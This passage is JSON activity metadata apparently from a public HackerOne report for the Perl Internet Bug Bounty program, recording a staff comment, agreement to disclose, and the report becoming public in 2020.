hacking.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-10T03:27:31.524Z","updated_at":"2020-10-10T03:27:31.524Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"tmnt53","url":"/tmnt53"},"genius_execution_id":null,"team_handle":"ibb-perl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9478911,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-10T03:27:35.708Z","updated_at":"2020-10-10T03:27:35.708Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-perl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9763229,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-09T03:27:46.397Z","updated_at":"2020-11-09T03:27:46.397Z","actor":{"url":"/ibb-perl","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/030/06e86a090af9d395cec5535eea83b90c72274566_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Perl (IBB)"}},"genius_execution_id":null,"team_handle":"ibb-perl","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}